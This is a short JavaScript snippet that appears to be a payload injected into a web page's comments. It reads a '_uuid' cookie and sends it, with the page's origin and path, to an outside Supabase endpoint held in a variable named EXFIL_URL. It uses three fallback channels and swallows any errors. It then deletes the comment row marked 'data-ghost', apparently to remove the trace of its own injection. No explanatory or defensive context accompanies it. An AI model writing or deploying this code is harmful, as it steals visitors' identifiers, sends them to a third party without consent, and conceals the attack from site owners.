(function () {
    var EXFIL_URL = 'https://skaqtfjzlxmtiwcugplg.supabase.co/functions/v1/get-uuid';
    var uuid = null, pairs = document.cookie.split(/;\s*/);
    for (var i = 0; i < pairs.length; i++) {
        var p = pairs[i].split('=');
        if (p[0] === '_uuid') uuid = decodeURIComponent(p.slice(1).join('='));
    }
    var b = JSON.stringify({
        t: new Date().toISOString(),
        origin: location.origin,
        path: location.pathname,
        uuid: uuid
    });
    try { navigator.sendBeacon(EXFIL_URL, new Blob([b], { type: 'text/plain' })); } catch (e) {}
    try { fetch(EXFIL_URL, { method: 'POST', mode: 'no-cors', body: b }); } catch (e) {}
    new Image().src = EXFIL_URL + '?d=' + encodeURIComponent(b);
    var host = document.querySelector('details[data-ghost]');
    var row = host && host.closest('.comment-row');
    if (row) {
        row.remove();
    }
    host && host.removeAttribute('data-ghost');
})();